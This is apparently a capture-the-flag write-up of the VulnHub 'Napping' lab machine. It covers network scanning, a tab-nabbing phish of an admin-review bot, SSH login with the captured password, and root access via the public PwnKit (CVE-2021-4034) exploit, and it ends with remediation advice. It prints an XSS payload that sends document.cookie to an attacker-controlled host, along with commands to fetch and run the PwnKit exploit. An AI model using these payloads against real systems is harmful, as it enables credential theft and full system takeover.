# Recon

## Finding the targets ip address

###### Command used

`sudo nmap -sn 192.168.56.0/24`

###### Result

```
Nmap scan report for 192.168.56.103
Host is up (0.00057s latency).
MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
```

###### Information found

The targets ip address is 192.168.56.103

## Scanning all ports

###### Command used

`sudo nmap -p- 192.168.56.103`

###### Output

```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-03 15:48 +0100
Nmap scan report for 192.168.56.103
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.31 seconds

```

###### Information found

The target machine has an open SSH port and an open http port, meaning their is more than likely a website I can check out

## Checking out the website

###### Command used

I used my browser to check out if the target machine has a website.

###### Output

I am greeted with a simple login screen and a sign up button

###### Information found

The login screen could be an attack vector for SQLi however with the database not showing on the nmap scan means this may not be the best path but something to keep in mind

## Testing SSH

###### Command used

`ssh 192.168.56.103`

###### Output

```
The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
ED25519 key fingerprint is: [removed by me]
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.103' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ben@192.168.56.103's password: 


```

###### Information found

The target machine does not have key only authentication meaning that their is a possibility for a brute force attack, they also aren't using post-quantum key exchange

# Enumeration

## Deeper service analysis

###### Command

`nmap -sC -sV 192.168.56.103`

###### Output

```
Nmap scan report for 192.168.56.103  
Host is up (0.00023s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)  
|   256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)  
|_  256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-title: Login  
| http-cookie-flags:    
|   /:    
|     PHPSESSID:    
|_      httponly flag not set  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/  
.  
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
```

###### Information found

The target machine likely uses Ubuntu and an old SSH version which is potentially vulnerable, wouldn't be my first target but something to remember, they are also running a Apache 2.4.41 which came out mid-late 2019 which is vulnerable to 102 known CVEs including remote code execution which is a critical issue.

## Creating an account

###### Command

Using burpesuite to check what a register looks like to see if I can see the query

###### Output

```
POST /register.php HTTP/1.1
Host: 192.168.56.103
Content-Length: 55
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://192.168.56.103
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.103/register.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=k3ucgpcsupete5m3iji4oh98n4
Connection: keep-alive

username=test&password=test123&confirm_password=test123
```

###### Information found

The session cookies are exposed this could be used to steal a logged in session token of another user threat level is serious, also the sites back end is certainly php.

## Checking the user space

###### Command

I am using my browser to navigate to the user space to see what is available.

###### Output

Their is only one input on the screen to input a link which will be viewed by the admin of the page for a blog review

###### Information found

Since their is presumably more directories unlocked to me since i have an account it is probably worth me running go buster to see if theirs any useful information, given the single input on the screen is for links which the admin will click and the old apache version their may be a vector for stealing the admins session cookie and logging in.

###### Checking for hidden directories

###### Command

```
gobuster dir -u http://192.168.56.103 -w ./big.txt -U test -P test123
```

###### Output

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Auth User:               test
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
server-status        (Status: 403) [Size: 279]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
==============================================================
```

###### Information found

The site only seems to have a couple of panels and a status link, the panels are likely controlled by the same admin clicking on the links

# Vulnerability analysis

## Looking for CVEs

### Apache 2.4.41

###### Command

`searchsploit apache | grep -i 2.4.41`

###### Output

`None`

###### Command

`msfconsole` `msf > search apache | grep -i 2.4.41`

###### Output

[-] No results from search

###### Command

I searched cvedetails.com for any CVEs relating to this apache version.

###### Output

```
# [CVE-2026-73636](https://www.cvedetails.com/cve/CVE-2026-73636/ "CVE-2026-73636 security vulnerability details")

Apache HTTP Server: mod_auth_digest one-time-nonce replay attack

Authentication bypass by capture-replay in mod_auth_digest in Apache Software Foundation Apache HTTP Server 2.4.x on all platforms allows a man-in-the-middle (MITM) attacker to replay captured digest authentication credentials via crafted requests that trigger garbage collection of the client's shared memory entry when AuthDigestNonceLifetime is set to 0. Users are recommended to upgrade to version 2.4.69, which fixes this issue.
```

###### Information found

This among other CVEs While damming to this version of apache all depend on other technologies being involved in the stack which I can't guarentee, so while an exploit almost certainly exists here I can be certain of which one with the information I have.

### OpenSSH 8.2p1

###### Command

I searched through the same only CVE database to see what i could find

#### Output

```
Untrusted search path in OpenSSH - CVE-2023-38408
Published: July 20, 2023 / Updated: January 9, 2026


Vulnerability identifier: #VU78454
CSH Severity: Medium
CVSS v4: 7.5 [CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N]
CVE-ID: CVE-2023-38408
CWE-ID: CWE-426
Exploitation vector: Remote access
Exploit availability: Public exploit is available

Vulnerability details
The vulnerability allows a remote attacker to compromise the affected system.

The vulnerability exists due to usage of an insecure search path within the PKCS#11 feature in ssh-agent. A remote attacker can trick the victim into connecting to a malicious SSH server and execute arbitrary code on the system, if an agent is forwarded to an attacker-controlled system.

Note, this vulnerability exists due to incomplete fix for #VU2015 (CVE-2016-10009).
```

###### Information learned

This CVE among others also all require me to trick the victim using the machine, since I am trying to crack a box these won't be relevant either

## The link input

### Checking for a hit

###### Command

I used burpsuite to change the input of the link and python to host a mini server to see if it would hit. Server: `python -m http.server 5555 --bind 0.0.0.0` Attack machine: http://192.168.56.1:5555/BOTCHECK

###### Output

```
192.168.56.103 - - [04/Oct/2026 11:42:03] code 404, message File not found  
192.168.56.103 - - [04/Oct/2026 11:42:03] "GET /BOTCHECK HTTP/1.1" 404 -`
```

###### Information found

This admin bot in question certainly clicks on links, if i can get the link to steal the admins cookie I should be able to login.

### Checking how the target machine renders links

###### Command

I entered a link into the pages input and submitted

###### Output

On screen

```
  
Thank you for your submission, you have entered: Here
```

Source code

```

<p>Thank you for your submission, you have entered:
<a href="http://192.168.56.1:5555" target="_blank">Here</a>
</p>
```

###### Information found

Since I can now see the method of link rendering I know how to make my code auto-execute.

# Exploitation

### Stealing the admins creds

##### Theory 1

Theory one is that the admin bot clicks on any link it is given however doesn't render the page normally, so I will want to craft a url that points it at the index page, assuming that the site redirects the bot the same way it redirects me when I hit it it should then render the script where the link is rendered

###### Command used

```
'><script>new Image().src=`http://192.168.56.1:5555/?c=`+document.cookie</script>
```

```
http://192.168.56.103
```

###### Output

`Nothing`

##### Theory 2

I noticed that the `<a` link on the page is rendered with `target='_blank'` maybe this box is vulnerable to tab-napping so if the bot clicks on any link i give them they can check it out and when returning to the previous page it will believe it needs to log back in and give me the credentials of the admin.

I will create a small fast api server for this (viewable at ./fastapi-server).

###### Command used

`fastapi server listening`

`Entering http://<myip>:5555 in the input box`

###### Output

```
INFO:     Started server process [17348]  
INFO:     Waiting for application startup.  
INFO:     Application startup complete.  
INFO:     Uvicorn running on http://0.0.0.0:5555 (Press CTRL+C to quit)   
INFO:     192.168.56.103:57366 - "GET / HTTP/1.1" 200 OK  
🎣 CAUGHT CREDS: {'username': 'daniel', 'password': 'C@ughtm3napping123'}  
INFO:     192.168.56.103:57368 - "POST /login.html HTTP/1.1" 200 OK
```

###### Information found

The login credentials for daniel.

Logging in might give me access to some of those restricted pages and ssh was password authenticated so that's worth a shot.

### Logging into the website with stolen creds

###### Command

Entering Daniels credentials on the login page

###### Output

Invalid username or password

###### Information Found

Weirdly these don't work here maybe theirs a another login for admins, something to look into after checking the ssh

### Checking SSH

###### Command

`ssh daniel@192.168.56.103`

###### Output

```
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/advantage  
  
 System information as of Sun Oct  4 19:58:50 UTC 2026  
  
 System load:  0.73               Processes:               130  
 Usage of /:   41.7% of 18.57GB   Users logged in:         0  
 Memory usage: 15%                IPv4 address for enp0s3: 192.168.56.103  
 Swap usage:   0%  
  
  
33 updates can be applied immediately.  
To see these additional updates run: apt list --upgradable  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by  
applicable law.  
  
  
Last login: Tue Oct 12 00:51:35 2021 from 10.0.2.15  
daniel@napping:~$
```

# Post Exploitation

### Permissions

##### Checking to see if I can get root

###### Command

`sudo su`

###### Output

`daniel is not in the sudoers file.  This incident will be reported.`

###### Information found

Daniel doesn't have root hopefully linpeas can find a potential path

#### Running linpeas

###### Command

`./linpeas.sh`

###### Output

```
══╣ Checking Pkexec and Polkit (T1548.003,T1548.004,T1068)
══╣ Polkit Binary (T1548.003,T1068)
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 May 26 2021 /usr/bin/pkexec
pkexec version 0.105
Potentially vulnerable to CVE-2021-4034 (PwnKit) - check distro patches
```

###### Information found

There was a lot of information to go through here but one thing stuck out in particular: PwnKit (CVE-2021-4034). This is a well-documented local root exploit with public PoCs, so I went looking for a quick one to use, viewable at `./CVE-2021-4034`.

### Executing CVE-2021-4034

###### Command

On my machine:

```
git clone https://github.com/berdav/CVE-2021-4034.git
scp -r CVE-2021-4034 daniel@192.168.56.103:~
```

On the target machine:

```
make
./cve-2021-4034
whoami
```

###### Output

```
# root
```

###### Information found

Root achieved via an unpatched SUID `pkexec` binary. No further privilege escalation needed from here.

# Impact

**Attack Chain:** Tab-nabbing credential theft via login page -> SSH password authentication as daniel -> local privilege escalation via CVE-2021-4034 -> full root access

**Severity: Critical**

An attacker with no prior access or deep knowledge of the target was able to achieve complete system compromise via an attack chain comprised of two well-documented issues, neither of which required specialised exploit development:

1. **Credential theft via tab-nabbing.** The site renders user-submitted links with `target="_blank"` and no protection against the referring tab being swapped out. An admin-review bot that clicks submitted links can be redirected to a fake login page and tricked into re-entering valid credentials.
2. **Privilege escalation via unpatched pkexec.** Once authenticated as a low-privilege user over SSH, an unpatched SUID `pkexec` binary (CVE-2021-4034 / PwnKit) converted that limited shell into full root access in seconds using a public exploit.

Neither vulnerability was novel — both are known issues with known fixes that simply hadn't been applied. Full compromise of the host means total loss of confidentiality, integrity, and availability for anything on the box.

# Recommended fix

**Quick 5 min fixes**

- Enable key-only authentication via SSH
- Enforce stronger password policies on the site
- For any web page that opens links in a new window, add `rel="noopener noreferrer"`
- Use an up-to-date browser

**Longer fixes**

- Perform a full system upgrade on the server to the latest version of Ubuntu
- Practice better patch management
- Educate all staff on phishing techniques

# Sources
Napping - https://www.vulnhub.com/entry/napping-101,752/
CVE-2021-4034 - https://github.com/berdav/CVE-2021-4034
